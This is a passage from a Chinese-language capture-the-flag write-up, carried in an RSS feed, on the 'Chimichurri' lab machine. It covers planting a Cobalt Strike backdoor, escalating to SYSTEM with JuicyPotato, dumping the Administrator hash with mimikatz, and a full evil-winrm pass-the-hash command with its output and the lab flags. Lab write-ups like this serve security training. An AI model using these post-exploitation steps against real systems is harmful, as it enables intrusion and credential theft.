+可以传一个 <a data-tooltip-position="top" aria-label="../../26-工具使用/RunasCS使用" data-href="../../26-工具使用/RunasCS使用" href="https://www.c1trus.top/26-工具使用/runascs使用.html" class="internal-link" target="_self" rel="noopener nofollow">RunasCS</a> 进行利用。也可以用传土豆进行提权<br>
+但 RunasCS 需要另一个用户的账号密码 所以这里排除使用这个<br>这里我都不选。我用cs提权<br>
+传一个cs后门运行，上线<br>
+<img alt="Pasted image 20241203135830" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203135830.png" referrerpolicy="no-referrer"><br>选择Juicypotato提权<br>
+<img alt="Pasted image 20241203140042" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203140042.png" referrerpolicy="no-referrer"><br>
+成功提取到系统<br>这里还有个问题。获取到了系统权限还不让我看flag，只给管理员权限的用户看看<br><br>这里需要降权。系统权限降权到管理员很简单、<br>
+在cs里面 可以使用进程注入 或者令牌窃取<br>这里我采用直接mimikatz抓管理员hash用管理员登录<br>
+<img alt="Pasted image 20241203142754" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203142754.png" referrerpolicy="no-referrer"><br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
+└─# evil-winrm -i 192.168.200.4 -u Administrador -H 058a4c99bab8b3d04a6bd959f95ce2b2
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; whoami
+chimichurri0\administrador
+
+*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; type c:\users\administrador\desktop\root.txt
+hjafcdv8a75e3cvsdfg6asd4f9vbsf9sa
+*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; type c:\users\hacker\desktop\user.txt
+acrsgvs6edr8f5vaw9a8eadv6fa9b
+
+<br>
+注意这比西班牙语的管理员名字与英语的管理员有区别
+]]></description><link>https://www.c1trus.top/24-渗透/thl/1.chimichurri.html</link><guid isPermaLink="false">24-渗透/THL/1.Chimichurri.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png"&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
